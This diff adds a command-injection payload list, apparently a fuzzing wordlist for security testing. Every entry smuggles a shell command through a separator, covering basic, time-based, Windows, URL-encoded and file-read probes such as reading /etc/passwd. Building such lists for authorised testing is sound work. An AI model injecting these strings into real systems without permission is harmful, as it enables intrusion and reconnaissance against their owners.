@@ -1,0 +1,46 @@
+# Command Injection Payloads
+# Basic command injection
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+` whoami `
+$(whoami)
+; id
+| id
+& id
+
+# Time-based detection
+; sleep 5
+| sleep 5
+& sleep 5
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# Windows commands
+; dir
+| dir
+& dir
+; ipconfig
+| ipconfig
+
+# Encoded payloads
+%3B whoami
+%7C whoami
+%26 whoami
+
+# With common separators
+test; whoami
+test| whoami
+test& whoami
+test && whoami
+test || whoami
+
+# File operations
+; cat /etc/passwd
+| cat /etc/passwd
+; ls -la
+| ls -la
+; type C:\windows\win.ini
+| type C:\windows\win.ini
